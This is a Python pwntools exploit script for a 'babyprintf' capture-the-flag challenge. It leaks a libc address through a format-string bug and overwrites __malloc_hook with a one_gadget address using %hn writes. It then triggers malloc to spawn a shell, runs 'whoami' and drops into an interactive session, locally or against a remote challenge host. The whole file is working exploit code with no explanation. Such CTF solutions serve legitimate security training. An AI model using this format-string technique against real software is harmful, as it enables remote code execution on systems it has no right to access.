#!/usr/bin/python

from pwn import *

def exploit():
	payload = "%43$p"
	r.sendline(payload)
	return_addr = int(r.recvline(False),16)
	libc.address = return_addr-0x21b97
	target = libc.symbols["__malloc_hook"]
	one_gadget = libc.address+0x10a38c

	log.info("return address: {}".format(hex(return_addr)))
	log.info("libc address: {}".format(hex(libc.address)))
	log.info("__malloc_hook: {}".format(hex(target)))
	log.info("one_gadget: {}".format(hex(one_gadget)))

	x = one_gadget & 0xffff
	y = (one_gadget >> 2*8) & 0xffff
	z = (one_gadget >> 4*8) & 0xffff
	payload = "%{:d}x%24$hn%{:d}x%25$hn%{:d}x%26$hn".format(
		x,
		(y-x) & 0xffff,
		(z-y) & 0xffff,
	).ljust(0x80,'\x00')
	payload += p64(target)
	payload += p64(target+2)
	payload += p64(target+4)
	payload = payload.ljust(0xf0,'\x00')
	r.sendline(payload)

	r.sendline("%65536x")
	r.sendline("whoami")
	r.recvuntil("babyprintf\n")

	r.interactive()

exe = ELF("./babyprintf")
libc = exe.libc

if len(sys.argv) < 2:
	r = process(exe.path)
	# gdb.attach(r,"""
	# 	pie break *0x8d8
	# 	c
	# """)
else:
	r = remote("babyprintf.problem.cscctf.com",10001)

exploit()
